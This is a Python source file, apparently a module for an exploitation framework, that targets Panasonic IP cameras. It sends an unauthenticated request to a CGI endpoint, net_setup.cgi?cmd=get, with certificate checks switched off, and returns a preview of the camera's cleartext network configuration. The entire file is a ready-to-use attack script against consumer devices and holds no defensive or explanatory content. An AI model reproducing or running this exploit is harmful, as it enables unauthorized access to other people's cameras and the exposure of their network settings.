import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "panasonic/config_leak_attack"
        self.description = "Exploit module to extract cleartext network mapping variables from Panasonic cameras."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/cgi-bin/net_setup.cgi?cmd=get"
        else:
            url = f"{target.rstrip('/')}/cgi-bin/net_setup.cgi?cmd=get"
            
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Downloading Panasonic sensitive memory configuration keys...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "network." in response.text:
                    preview = response.text[:400] + "\n[... Panasonic Text Data Matrix Truncated ...]"
                    return {
                        "success": True,
                        "details": f"Panasonic environment configuration table extracted:\n{preview}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit delivery completed but target system did not yield text strings."}
